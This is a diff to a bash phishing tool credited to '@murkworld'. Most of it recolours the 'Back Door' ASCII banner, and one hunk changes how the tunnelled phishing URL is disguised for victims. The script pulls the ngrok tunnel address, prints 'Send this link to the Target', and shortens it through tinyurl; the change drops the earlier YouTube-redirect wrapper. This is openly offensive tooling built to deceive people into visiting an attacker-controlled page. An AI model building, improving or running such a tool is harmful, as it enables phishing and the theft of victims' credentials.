@@ -203,19 +203,19 @@ fi
 
 banner() {
 
-printf "\e[1;77m  ▄▄▄▄    ▄▄▄       ▄████▄   ██ ▄█▀   ▓█████▄  ▒█████   ▒█████   ██▀███  \e[0m\n"
-printf "\e[1;77m ▓█████▄ ▒████▄    ▒██▀ ▀█   ██▄█▒    ▒██▀ ██▌▒██▒  ██▒▒██▒  ██▒▓██ ▒ ██▒ \e[0m\n"
-printf "\e[1;77m ▒██▒ ▄██▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ░██   █▌▒██░  ██▒▒██░  ██▒▓██ ░▄█ ▒ \e[0m\n"
-printf "\e[1;77m ▒██░█▀  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ░▓█▄   ▌▒██   ██░▒██   ██░▒██▀▀█▄  \e[0m\n"
-printf "\e[1;77m ░▓█  ▀█▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ░▒████▓ ░ ████▓▒░░ ████▓▒░░██▓ ▒██▒ \e[0m\n"
-printf "\e[1;77m ░▒▓███▀▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒    ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ \e[0m\n"
-printf "\e[1;77m ▒░▒   ░   ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░    ░ ▒  ▒   ░ ▒ ▒░   ░ ▒ ▒░   ░▒ ░ ▒░ \e[0m\n"
-printf "\e[1;77m  ░    ░   ░   ▒   ░        ░ ░░ ░     ░ ░  ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░░   ░  \e[0m\n"
-printf "\e[1;77m  ░            ░  ░░ ░      ░  ░         ░        ░ ░      ░ ░     ░      \e[0m\n"
-printf "\e[1;77m       ░           ░                   ░                                 \e[0m\n"
+printf "\e[1;91m  ▄▄▄▄    ▄▄▄       ▄████▄   ██ ▄█▀   ▓█████▄  ▒█████   ▒█████   ██▀███  \e[0m\n"
+printf "\e[1;91m ▓█████▄ ▒████▄    ▒██▀ ▀█   ██▄█▒    ▒██▀ ██▌▒██▒  ██▒▒██▒  ██▒▓██ ▒ ██▒ \e[0m\n"
+printf "\e[1;91m ▒██▒ ▄██▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ░██   █▌▒██░  ██▒▒██░  ██▒▓██ ░▄█ ▒ \e[0m\n"
+printf "\e[1;91m ▒██░█▀  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ░▓█▄   ▌▒██   ██░▒██   ██░▒██▀▀█▄  \e[0m\n"
+printf "\e[1;91m ░▓█  ▀█▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ░▒████▓ ░ ████▓▒░░ ████▓▒░░██▓ ▒██▒ \e[0m\n"
+printf "\e[1;31m ░▒▓███▀▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒    ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ \e[0m\n"
+printf "\e[1;31m ▒░▒   ░   ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░    ░ ▒  ▒   ░ ▒ ▒░   ░ ▒ ▒░   ░▒ ░ ▒░ \e[0m\n"
+printf "\e[1;31m  ░    ░   ░   ▒   ░        ░ ░░ ░     ░ ░  ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░░   ░  \e[0m\n"
+printf "\e[1;31m  ░            ░  ░░ ░      ░  ░         ░        ░ ░      ░ ░     ░      \e[0m\n"
+printf "\e[1;31m       ░           ░                   ░                                 \e[0m\n"
 
 printf "\n"
-printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: @murkworld \e[0m\e[1;93m.:.:.\e[0m\n"
+printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: \e[5m@murkworld \e[0m\e[1;93m.:.:.\e[0m\n"
 printf "\n"
 }
 
@@ -483,7 +483,7 @@ sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
-send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
+send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=$link" | head -n1)
 #send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
@@ -541,4 +541,3 @@ done
 banner
 dependencies
 menu
-
